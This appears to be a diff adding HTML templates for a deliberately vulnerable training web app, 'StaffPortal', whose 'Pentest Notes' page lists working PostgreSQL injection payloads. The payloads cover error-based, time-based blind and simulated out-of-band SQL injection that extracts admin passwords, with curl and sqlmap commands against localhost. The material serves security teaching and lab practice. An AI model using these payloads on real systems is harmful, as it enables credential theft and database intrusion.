@@ -1,0 +1,361 @@
+{{define "search.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}} – StaffPortal</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Staff<span>Portal</span></a>
+  <nav>
+    <a href="/search" class="active">Directory</a>
+    <a href="/department?dept=Engineering">Teams</a>
+    <a href="/profile" class="cta">My Profile</a>
+  </nav>
+</header>
+<main>
+  <div class="page-header">
+    <h1>Employee Directory</h1>
+    <form class="inline-form" method="get" action="/search">
+      <input type="text" name="name" placeholder="Name…" value="{{.Data.Name}}">
+      <button type="submit">Search</button>
+    </form>
+  </div>
+
+  {{if .Data.Error}}
+  <div class="alert alert-error">{{.Data.Error}}</div>
+  {{end}}
+
+  {{if .Data.Rows}}
+  <table class="data-table">
+    <thead><tr>{{range .Data.Cols}}<th>{{.}}</th>{{end}}</tr></thead>
+    <tbody>
+      {{range .Data.Rows}}
+      <tr>{{range .}}<td>{{.}}</td>{{end}}</tr>
+      {{end}}
+    </tbody>
+  </table>
+  {{else if not .Data.Error}}
+  <p class="empty">{{if .Data.Name}}No results for "{{.Data.Name}}".{{else}}Enter a name to search the directory.{{end}}</p>
+  {{end}}
+</main>
+<footer>
+  <p>© 2024 StaffPortal &nbsp;|&nbsp; <a href="/docs">Pentest Notes</a> &nbsp;|&nbsp; <a href="/oob-log">OOB Log</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "department.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}} – StaffPortal</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Staff<span>Portal</span></a>
+  <nav>
+    <a href="/search">Directory</a>
+    <a href="/department?dept=Engineering" class="active">Teams</a>
+    <a href="/profile" class="cta">My Profile</a>
+  </nav>
+</header>
+<main>
+  <div class="page-header">
+    <h1>Team: {{.Data.Dept}} <span class="elapsed-badge">{{.Data.Elapsed}}</span></h1>
+    <form class="inline-form" method="get" action="/department">
+      <select name="dept">
+        <option value="Engineering">Engineering</option>
+        <option value="Finance">Finance</option>
+        <option value="Marketing">Marketing</option>
+        <option value="HR">HR</option>
+      </select>
+      <button type="submit">Go</button>
+    </form>
+  </div>
+
+  {{if .Data.Error}}<div class="alert alert-error">{{.Data.Error}}</div>{{end}}
+
+  {{if .Data.Rows}}
+  <table class="data-table">
+    <thead><tr>{{range .Data.Cols}}<th>{{.}}</th>{{end}}</tr></thead>
+    <tbody>
+      {{range .Data.Rows}}
+      <tr onclick="location.href='/employee?id={{index . 0}}'" style="cursor:pointer">
+        {{range .}}<td>{{.}}</td>{{end}}
+      </tr>
+      {{end}}
+    </tbody>
+  </table>
+  {{else if not .Data.Error}}
+  <p class="empty">No employees in this department.</p>
+  {{end}}
+</main>
+<footer>
+  <p>© 2024 StaffPortal &nbsp;|&nbsp; <a href="/docs">Pentest Notes</a> &nbsp;|&nbsp; <a href="/oob-log">OOB Log</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "employee.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}} – StaffPortal</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Staff<span>Portal</span></a>
+  <nav>
+    <a href="/search">Directory</a>
+    <a href="/department?dept=Engineering">Teams</a>
+    <a href="/profile" class="cta">My Profile</a>
+  </nav>
+</header>
+<main>
+  {{if .Data.Error}}
+  <div class="alert alert-error">{{.Data.Error}}</div>
+  <a href="/" class="btn btn-ghost" style="margin-top:.5rem">← Back</a>
+  {{else if .Data.Emp}}
+  <div class="profile-card">
+    <div class="profile-avatar" data-name="{{.Data.Emp.Name}}"></div>
+    <div class="profile-name">{{.Data.Emp.Name}} <span class="elapsed-badge">{{.Data.Elapsed}}</span></div>
+    <div class="profile-title">{{.Data.Emp.Title}}</div>
+    <dl class="profile-details">
+      <dt>Department</dt><dd>{{.Data.Emp.Department}}</dd>
+      <dt>Email</dt><dd>{{.Data.Emp.Email}}</dd>
+      <dt>Salary</dt><dd>R$ {{.Data.Emp.Salary}}</dd>
+      <dt>Hire Date</dt><dd>{{.Data.Emp.HireDate}}</dd>
+    </dl>
+  </div>
+  <a href="/department?dept={{.Data.Emp.Department}}" class="btn btn-ghost">← {{.Data.Emp.Department}} Team</a>
+  {{end}}
+</main>
+<footer>
+  <p>© 2024 StaffPortal &nbsp;|&nbsp; <a href="/docs">Pentest Notes</a> &nbsp;|&nbsp; <a href="/oob-log">OOB Log</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "profile.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}} – StaffPortal</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Staff<span>Portal</span></a>
+  <nav>
+    <a href="/search">Directory</a>
+    <a href="/department?dept=Engineering">Teams</a>
+    <a href="/profile" class="cta active">My Profile</a>
+  </nav>
+</header>
+<main>
+  <div class="form-page">
+    <h1>My Profile</h1>
+    <p class="form-subtitle">View your HR record by entering your employee ID.</p>
+
+    {{if .Error}}<div class="alert alert-error">{{.Error}}</div>{{end}}
+
+    <form class="auth-form" method="post" action="/profile">
+      <div class="field">
+        <label>Employee ID</label>
+        <input type="text" name="employee_id" placeholder="e.g. 1" required>
+      </div>
+      <button type="submit" class="btn btn-accent btn-full">Load Profile</button>
+    </form>
+
+    {{if .Data.Rows}}
+    <div style="margin-top:1.5rem">
+      <table class="data-table">
+        <thead><tr>{{range .Data.Cols}}<th>{{.}}</th>{{end}}</tr></thead>
+        <tbody>
+          {{range .Data.Rows}}
+          <tr>{{range .}}<td>{{.}}</td>{{end}}</tr>
+          {{end}}
+        </tbody>
+      </table>
+    </div>
+    {{end}}
+    {{if .Data.Error}}<div class="alert alert-error" style="margin-top:1rem">{{.Data.Error}}</div>{{end}}
+  </div>
+</main>
+<footer>
+  <p>© 2024 StaffPortal &nbsp;|&nbsp; <a href="/docs">Pentest Notes</a> &nbsp;|&nbsp; <a href="/oob-log">OOB Log</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "ooblog.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>OOB Exfil Log – StaffPortal</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Staff<span>Portal</span></a>
+  <nav>
+    <a href="/search">Directory</a>
+    <a href="/department?dept=Engineering">Teams</a>
+    <a href="/oob-log" class="active">OOB Log</a>
+    <a href="/profile" class="cta">My Profile</a>
+  </nav>
+</header>
+<main>
+  <div class="page-header">
+    <h1>OOB Exfiltration Log</h1>
+    <p style="color:var(--muted);font-size:.9rem">Simulated attacker receive-server — entries written via <code>oob_exfil()</code> PostgreSQL function.</p>
+  </div>
+  {{if .Data.Error}}<div class="alert alert-error">{{.Data.Error}}</div>{{end}}
+  <div class="oob-log">
+    {{range .Data.Rows}}
+    <div class="oob-entry">
+      <span class="oob-ts">[{{index . 3}}] [{{index . 2}}]</span>
+      {{index . 1}}
+    </div>
+    {{else}}
+    <div style="color:#7a6aaa;padding:.5rem 0">— No entries yet. Inject via /profile?employee_id= —</div>
+    {{end}}
+  </div>
+</main>
+<footer>
+  <p>© 2024 StaffPortal &nbsp;|&nbsp; <a href="/docs">Pentest Notes</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "docs.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Pentest Notes – StaffPortal</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Staff<span>Portal</span></a>
+  <nav>
+    <a href="/search">Directory</a>
+    <a href="/department?dept=Engineering">Teams</a>
+    <a href="/profile" class="cta">My Profile</a>
+  </nav>
+</header>
+<main class="docs-main">
+  <h1>Pentest Notes – StaffPortal</h1>
+  <p class="docs-intro">Exploitation reference for security assessment. Database: app4_db.</p>
+
+  <div class="vuln-card">
+    <div class="vuln-header">
+      <span class="vuln-id">VULN-13</span>
+      <span class="vuln-type">Visible Error-Based SQL Injection</span>
+    </div>
+    <p><strong>Endpoint:</strong> <code>GET /search?name=&lt;value&gt;</code></p>
+    <p><strong>Context:</strong> The <code>name</code> parameter is concatenated into a PostgreSQL ILIKE query. Errors (e.g. CAST failures) are rendered directly on the page.</p>
+    <pre><code># Confirm injection
+' AND 1=1--           → results returned
+' AND 1=2--           → no results
+
+# Leak password via CAST error
+' AND 1=CAST((SELECT password FROM credentials LIMIT 1) AS INTEGER)--
+
+# Leak version
+' AND 1=CAST(version() AS INTEGER)--
+
+# cURL
+curl "http://localhost:8084/search?name=%27+AND+1%3DCAST((SELECT+password+FROM+credentials+LIMIT+1)+AS+INTEGER)--"</code></pre>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-header">
+      <span class="vuln-id">VULN-14</span>
+      <span class="vuln-type">Blind SQLi – Time Delays</span>
+    </div>
+    <p><strong>Endpoint:</strong> <code>GET /department?dept=&lt;value&gt;</code></p>
+    <p><strong>Context:</strong> dept is injected into a WHERE clause. Response time (shown on page) acts as the oracle. Use pg_sleep to confirm injection.</p>
+    <pre><code># 5-second delay — injection confirmed
+Engineering'||(SELECT pg_sleep(5))--
+Engineering'; SELECT pg_sleep(5)--
+
+# Conditional delay to confirm DB name
+Engineering' AND (SELECT CASE WHEN (current_database()='app4_db') THEN pg_sleep(5) ELSE pg_sleep(0) END)=''--
+
+# cURL
+curl -w "\nTime: %{time_total}s\n" \
+  "http://localhost:8084/department?dept=Engineering%27%7C%7C(SELECT+pg_sleep(5))--"</code></pre>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-header">
+      <span class="vuln-id">VULN-15</span>
+      <span class="vuln-type">Blind SQLi – Time Delays + Data Retrieval</span>
+    </div>
+    <p><strong>Endpoint:</strong> <code>GET /employee?id=&lt;value&gt;</code></p>
+    <p><strong>Context:</strong> id is injected into a numeric WHERE clause. Conditional pg_sleep reveals one bit per request; accumulate bits to extract secrets.</p>
+    <pre><code># Confirm injection (5s delay)
+1; SELECT pg_sleep(5)--
+
+# Extract admin password char by char
+# TRUE → 5s delay | FALSE → no delay
+1; SELECT CASE WHEN SUBSTRING(password,1,1)='S' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM credentials WHERE username='admin'--
+
+# Automate
+sqlmap -u "http://localhost:8084/employee?id=1" --technique=T --dbms=postgresql -p id --dump</code></pre>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-header">
+      <span class="vuln-id">VULN-16</span>
+      <span class="vuln-type">Blind SQLi – OOB Interaction (Simulated)</span>
+    </div>
+    <p><strong>Endpoint:</strong> <code>POST /profile</code> — field <code>employee_id</code></p>
+    <p><strong>Context:</strong> The oob_exfil() PostgreSQL function writes to oob_log. Results are visible at /oob-log, simulating a DNS/HTTP receive server.</p>
+    <pre><code># Exfiltrate admin password
+employee_id = 1 OR 1=(SELECT oob_exfil((SELECT password FROM credentials WHERE username='admin'),'vuln16')::integer)
+
+# Exfiltrate DB version
+employee_id = 1; SELECT oob_exfil(version(),'vuln16')--
+
+# cURL
+curl -X POST http://localhost:8084/profile \
+  -d "employee_id=1 OR 1=(SELECT oob_exfil((SELECT password FROM credentials WHERE username%3D'admin'),'v16')::integer)"
+
+# View exfiltrated data
+curl http://localhost:8084/oob-log</code></pre>
+    <p><em>Real OOB would use dblink, COPY TO PROGRAM, or DNS via pg_read_file/pg_exec. Documented here for lab simulation only.</em></p>
+  </div>
+
+  <div class="vuln-card info">
+    <p><strong>Tables:</strong> employees, departments, credentials(username,password,is_admin), oob_log &nbsp;|&nbsp; <strong>Target:</strong> credentials</p>
+  </div>
+</main>
+<footer>
+  <p>© 2024 StaffPortal &nbsp;|&nbsp; <a href="/docs">Pentest Notes</a> &nbsp;|&nbsp; <a href="/oob-log">OOB Log</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
